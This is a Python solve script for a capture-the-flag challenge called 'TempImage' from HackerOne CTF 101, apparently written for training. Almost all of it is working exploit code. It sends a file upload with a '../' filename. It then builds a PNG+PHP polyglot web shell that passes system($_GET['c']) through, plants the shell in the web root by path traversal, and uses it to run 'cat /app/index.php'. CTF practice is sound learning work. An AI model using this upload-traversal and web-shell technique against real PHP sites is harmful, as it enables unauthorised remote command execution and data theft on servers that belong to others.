#!/usr/bin/env python3
"""
PoC: TempImage (HackerOne CTF 101)
Server: openresty/1.29.2.4 + PHP/5.5.9
Flags: 2 (path traversal error reveal + RCE/polyglot)

Usage: python3 solve.py <ctf_url>
"""

import re
import sys
import hashlib
from urllib.parse import quote

import requests


FLAG_RE = re.compile(r'\^FLAG\^([0-9a-f]{64})\$FLAG\$')


def flag0_path_traversal(base_url):
    """
    Flag 0: Path traversal triggers PHP error containing the flag.

    doUpload.php checks for '../' in the filename and echoes the flag:
        if(strpos($_POST['filename'], '../') !== false)
            echo '<br>^FLAG^...$FLAG$';

    We upload a valid PNG with filename containing '../' to trigger this.
    """
    print("[*] Flag 0: Triggering path traversal error...")

    # Create a minimal valid PNG (1x1 black pixel)
    png = (
        b'\x89PNG\r\n\x1a\n'
        b'\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02'
        b'\x00\x00\x00\x90wS\xde\x00\x00\x00\x0bIDATx\xdac\xf8\x0f'
        b'\x00\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82'
    )

    resp = requests.post(
        f'{base_url}/doUpload.php',
        files={'file': ('test.png', png, 'image/png')},
        data={'filename': '../flag0.png'},
    )

    match = FLAG_RE.search(resp.text)
    if match:
        flag = match.group(1)
        print(f'[+] Flag 0: {flag}')
        return flag
    else:
        print('[-] Flag 0 not found in response')
        return None


def flag1_rce_polyglot(base_url):
    """
    Flag 1: RCE via PNG polyglot + path traversal.

    1. Create a file with valid PNG header + PHP webshell payload
    2. Upload with 'filename=/../../shell.php' to place in web root
    3. Access the shell to read /app/index.php which contains the flag
       as a PHP comment: <?php /* ^FLAG^...$FLAG$ */ ?>
    """
    print("[*] Flag 1: Building PNG+PHP polyglot webshell...")

    # The path traversal uses filename starting with '/../../'
    # Resulting path: files/{md5}_/../../shell.php -> /app/shell.php
    shell_name = '/../../x.php'

    # Minimal PNG header that passes getimagesize() PNG check
    # Followed by PHP webshell
    php_code = (
        b'<?php '
        b'if(isset($_GET["c"])){system($_GET["c"]);}'
        b'else{header("HTTP/1.0 404");} '
        b'__halt_compiler(); ?>'
    )

    payload = b'\x89PNG\r\n\x1a\n' + php_code

    print(f'[+] Payload size: {len(payload)} bytes')

    # Upload the polyglot via path traversal
    resp = requests.post(
        f'{base_url}/doUpload.php',
        files={'file': ('shell.png', payload, 'image/png')},
        data={'filename': shell_name},
        allow_redirects=False,
    )

    print(f'[*] Upload response: {resp.status_code}')

    # Access the webshell to read index.php
    cmd = 'cat /app/index.php'
    shell_url = f'{base_url}/x.php?c={quote(cmd)}'
    resp = requests.get(shell_url)

    match = FLAG_RE.search(resp.text)
    if match:
        flag = match.group(1)
        print(f'[+] Flag 1: {flag}')
        return flag
    else:
        print('[-] Flag 1 not found')
        return None


def main():
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <ctf_base_url>')
        print(f'Example: {sys.argv[0]} https://xxxx.ctf.hacker101.com/')
        sys.exit(1)

    base_url = sys.argv[1].rstrip('/')

    print(f'[*] Target: {base_url}')
    print(f'[*] Challenge: TempImage (HackerOne CTF 101)')
    print()

    flags = {}

    # Flag 0: Path traversal error reveals flag
    f0 = flag0_path_traversal(base_url)
    if f0:
        flags[0] = f0

    # Flag 1: RCE via PNG polyglot + read index.php
    f1 = flag1_rce_polyglot(base_url)
    if f1:
        flags[1] = f1

    print()
    print('=' * 50)
    print('Summary:')
    for num, flag in sorted(flags.items()):
        print(f'  Flag {num}: {flag}')
    print(f'  Total: {len(flags)}/2 flags captured')
    print('=' * 50)


if __name__ == '__main__':
    main()
